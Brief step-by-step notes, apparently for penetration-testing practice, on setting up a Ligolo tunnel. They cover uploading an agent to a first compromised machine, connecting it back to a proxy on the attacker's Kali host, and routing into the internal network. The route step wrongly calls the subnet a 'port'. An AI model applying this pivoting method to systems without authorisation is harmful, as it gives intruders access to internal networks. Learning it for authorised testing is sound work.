- Connect to the first machine.
- Upload the agent program in that machine

- Create a new tun network on your local(attacking) machine. The commands are
        sudo ip tuntap add user (your username) mode tun ligolo
        sudo ip link set ligolo up
        ip addr show ligolo (to see if it is up)

- On your local machine run the proxy program:
        ./proxy -selfcert

- Then on the first machine you have, type the following command:
        ./agent -connect (your ligolo tun ip):(listening port) -ignore-cert 
        (you can use autocert as well. By default the port number is 11601).

- Now you will be connected to the first machine via your local machine

- Type the command: ( To list all active and connected sessions from that agent). Use arrow keys to toggle between multiple sessions.
        session 

- Check all the configrations of networks on the first machine using your local machine by using the command
        ifconfig

- Open another kali linux terminal to create a route to the next machine. Use the command:
        sudo ip route add (new ip)/port dev ligolo
    newip/port is basically the IPv4 address that you can get from ifconfig.

- Then go back to the terminal which already has access to the first machine and write the command:
        start 
    this will start the tunnel

- Now you can naturally access the internal network from your attack machine
